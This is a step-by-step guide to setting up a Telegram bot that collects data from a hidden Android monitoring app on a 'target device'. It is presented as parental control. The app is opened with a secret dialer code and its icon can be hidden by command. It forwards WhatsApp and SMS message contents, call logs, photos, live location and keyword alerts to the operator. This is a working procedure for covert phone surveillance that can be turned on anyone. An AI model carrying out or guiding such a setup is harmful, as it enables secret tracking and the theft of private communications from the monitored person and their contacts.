# Telegram Bot Setup Guide

## 🤖 Complete Telegram Integration Setup

This guide walks you through setting up the Telegram bot to receive monitoring data from your parental control app.

## Phase 1: Creating Your Telegram Bot

### Step 1: Contact BotFather
1. **Open Telegram** on your monitoring device (your phone/computer)
2. **Search for:** `@BotFather`
3. **Start a chat** with BotFather
4. **Send:** `/start` to begin

### Step 2: Create New Bot
1. **Send:** `/newbot`
2. **BotFather asks for bot name:**
   ```
   Type: Parental Control Monitor
   ```
3. **BotFather asks for username:**
   ```
   Type: your_parental_monitor_bot
   (must end with 'bot' and be unique)
   ```

### Step 3: Save Your Bot Token
BotFather will respond with:
```
Congratulations! Here is your token:
123456789:ABCdefGHIjklMNOpqrSTUvwxyz-1234567890

Keep your token secure! Anyone with your token can control your bot.
```

**📝 SAVE THIS TOKEN - You'll need it for the app configuration!**

### Step 4: Configure Bot Settings
1. **Send:** `/setdescription` to BotFather
2. **Select your bot**
3. **Set description:**
   ```
   Parental control monitoring bot for tracking device activity
   ```

4. **Send:** `/setabouttext` to BotFather
5. **Select your bot**
6. **Set about text:**
   ```
   Monitors device activity for parental control purposes
   ```

## Phase 2: Getting Your Chat ID

### Method 1: Simple Message Method
1. **Find your bot** in Telegram (search for the username you created)
2. **Send any message** to your bot (e.g., "Hello")
3. **Open a web browser** and visit:
   ```
   https://api.telegram.org/bot<YOUR_BOT_TOKEN>/getUpdates
   ```
   Replace `<YOUR_BOT_TOKEN>` with your actual token

4. **Look for your Chat ID** in the response:
   ```json
   {
     "ok": true,
     "result": [
       {
         "update_id": 123456789,
         "message": {
           "message_id": 1,
           "from": {
             "id": 987654321,
             "first_name": "Your Name"
           },
           "chat": {
             "id": 987654321,  ← THIS IS YOUR CHAT ID
             "first_name": "Your Name",
             "type": "private"
           },
           "text": "Hello"
         }
       }
     ]
   }
   ```

### Method 2: Using @userinfobot
1. **Search for:** `@userinfobot` in Telegram
2. **Send:** `/start` to the bot
3. **The bot will reply with your user information including Chat ID**

### Method 3: Using @get_id_bot
1. **Search for:** `@get_id_bot` in Telegram  
2. **Send:** `/start` to the bot
3. **Your Chat ID will be displayed**

**📝 SAVE YOUR CHAT ID - You'll need it for the app configuration!**

## Phase 3: Testing Your Bot

### Verify Bot is Working
1. **Open browser** and visit:
   ```
   https://api.telegram.org/bot<YOUR_BOT_TOKEN>/sendMessage?chat_id=<YOUR_CHAT_ID>&text=Test message
   ```
   Replace with your actual bot token and chat ID

2. **You should receive** "Test message" in your Telegram chat
3. **If successful** ✅ - Your bot is ready!
4. **If failed** ❌ - Double-check your token and chat ID

## Phase 4: Configuring the Android App

### Step 1: Access Hidden App
1. **On target device** (Huawei Nova 3i)
2. **Open Phone Dialer**
3. **Type:** `*#12345#`
4. **App should open automatically**

### Step 2: Enter Bot Credentials
1. **Go to Settings** → **Telegram Configuration**
2. **Enter Bot Token:** (from Phase 1, Step 3)
3. **Enter Chat ID:** (from Phase 2)
4. **Save Configuration**

### Step 3: Test Connection
1. **Tap "Test Connection"** in app settings
2. **Check your Telegram** - you should receive:
   ```
   🔧 Parental Control Monitor - Test Message
   Device: Huawei Nova 3i
   Status: Connected successfully
   Time: 2025-08-13 15:30:45
   ```

## Phase 5: Bot Commands & Features

### Available Commands
Once configured, you can send these commands to your bot:

| Command | Description | Example Response |
|---------|-------------|------------------|
| `/start` | Initialize bot and start monitoring | "Monitoring started for Device1" |
| `/stop` | Stop monitoring services | "Monitoring stopped for Device1" |
| `/status` | Get current monitoring status | Service status, battery, last sync |
| `/location` | Request current device location | GPS coordinates with map link |
| `/apps` | Get app usage summary | Screen time breakdown by app |
| `/photos` | Get recent photos | List of recent media files |
| `/calls` | Get call history | Recent call logs with details |
| `/sms` | Get SMS history | Recent text messages |
| `/settings` | View current configuration | Current monitoring settings |
| `/hide` | Hide app icon on device | "App icon hidden successfully" |
| `/show` | Show app icon on device | "App icon visible in app drawer" |
| `/help` | Show available commands | List of all commands |

### Automatic Notifications

Your bot will automatically send these types of messages:

#### 1. Real-time Notifications
```
📱 WhatsApp Notification
👤 Contact: Sarah Johnson
💬 Message: "Are you coming to the party tonight?"
⏰ Time: 2025-08-13 19:45:23
📱 App: WhatsApp
🔋 Battery: 67%
```

#### 2. Location Updates
```
📍 Location Update
🏠 Address: 123 Oak Street, Springfield, IL
🗺️ Coordinates: 39.7817, -89.6501
🎯 Accuracy: 12 meters
⏰ Time: 2025-08-13 19:30:15
🔋 Battery: 67%
📱 View on Map: https://maps.google.com/?q=39.7817,-89.6501
```

#### 3. App Usage Reports
```
📊 Daily App Usage Report - August 13, 2025

🎵 TikTok: 2h 45m (45% of screen time)
📸 Instagram: 1h 32m (25% of screen time)  
💬 WhatsApp: 45m (12% of screen time)
👻 Snapchat: 23m (6% of screen time)
🎮 Mobile Games: 35m (9% of screen time)
📚 Other Apps: 15m (3% of screen time)

📱 Total Screen Time: 6h 5m
🔋 Battery Used: 34%
📶 Data Used: 156 MB
```

#### 4. Media Alerts
```
📸 New Photo Detected
📁 File: IMG_20250813_194523.jpg
📏 Size: 2.8 MB
📂 Location: /DCIM/Camera/
⏰ Time: 2025-08-13 19:45:23
📱 App: Camera
🖼️ [Photo thumbnail will be sent]
```

#### 5. Call Monitoring
```
📞 Call Activity Log

📞 Outgoing Call
📱 Number: +1 (555) 123-4567
👤 Contact: Mom
⏱️ Duration: 8 minutes 34 seconds
⏰ Time: 2025-08-13 19:15:00
📍 Location: Home
```

#### 6. SMS Monitoring
```
💬 Text Message Activity

📥 Received SMS
📱 From: +1 (555) 987-6543
👤 Contact: Alex Thompson
💬 Message: "Don't forget about homework due tomorrow!"
⏰ Time: 2025-08-13 18:30:22
📍 Location: School area
```

#### 7. Security Alerts
```
🚨 Security Alert
⚠️ Event: App installation attempt
📱 App: Unknown APK file
🔍 Source: Browser download
⏰ Time: 2025-08-13 20:15:33
🛡️ Action: Installation blocked
```

## Phase 6: Advanced Bot Features

### Geofencing Alerts
Set up location-based alerts:

```
📍 Geofence Alert - School Zone
✅ Entered: Washington High School
⏰ Time: 2025-08-13 08:15:22
📱 Device: Nova3i_Device1
🎒 Expected: Yes (School hours)
```

### Keyword Monitoring
Get alerts for specific words in messages:

```
🔍 Keyword Alert
⚠️ Trigger word: "party"
💬 Full message: "There's a party at Jake's house tonight"
📱 App: Instagram DM
👤 Contact: @username123
⏰ Time: 2025-08-13 16:45:12
```

### Emergency Notifications
Immediate alerts for concerning activity:

```
🚨 EMERGENCY ALERT
⚠️ Critical activity detected
📱 Multiple inappropriate content warnings
⏰ Time: 2025-08-13 22:30:45
🔧 Action required: Review device immediately
```

## Phase 7: Bot Management

### Privacy Settings
1. **Bot is private** - only you can interact with it
2. **Secure your bot token** - never share publicly
3. **Regular security checks** - monitor bot activity

### Data Management
- **Messages are encrypted** in transit
- **No data stored** on Telegram servers permanently
- **You control data retention** in app settings
- **Delete conversations** anytime to remove history

### Troubleshooting Bot Issues

#### Bot Not Responding:
1. **Check bot token** is correct in app
2. **Verify chat ID** is accurate
3. **Test with browser URL** method above
4. **Restart the app** on target device

#### Missing Messages:
1. **Check internet connection** on target device
2. **Verify permissions** granted to app
3. **Check if bot was blocked** accidentally
4. **Look in Telegram spam folder**

#### Delayed Notifications:
1. **Check device battery optimization** settings
2. **Ensure app is in protected apps** list
3. **Verify background data** allowed for app
4. **Check Telegram notification settings**

## 📱 Example: Complete Setup Flow

Let's walk through a complete example:

### Your Bot Details:
- **Bot Name:** `Parental Control Monitor`
- **Bot Username:** `john_parental_bot`
- **Bot Token:** `123456789:ABCdefGHIjklMNOpqrSTUvwxyz`
- **Your Chat ID:** `987654321`

### Configuration in App:
1. **Access app:** Dial `*#12345#` on target device
2. **Go to:** Settings → Telegram Configuration
3. **Enter Bot Token:** `123456789:ABCdefGHIjklMNOpqrSTUvwxyz`
4. **Enter Chat ID:** `987654321`
5. **Test Connection:** Should receive test message
6. **Save and Exit**

### First Day Operation:
```
8:15 AM - 📍 Left home (Geofence alert)
8:45 AM - 📍 Arrived at school
12:30 PM - 💬 WhatsApp: "Can't wait for lunch!"
3:15 PM - 📍 Left school
4:00 PM - 📸 New photo taken
6:30 PM - 📊 Daily usage report: 4h 20m screen time
10:00 PM - 🔋 Battery low warning (15%)
```

Your Telegram bot is now fully configured and ready to monitor device activity! 🎯📱

## 🔐 Security Best Practices

1. **Keep bot token secret** - treat it like a password
2. **Don't share chat ID** publicly
3. **Use strong phone security** (lock screen, 2FA)
4. **Regularly check bot activity** for unusual messages
5. **Backup your configuration** settings
6. **Update app regularly** when new versions available

---

**Your monitoring system is now complete and operational!** 🚀
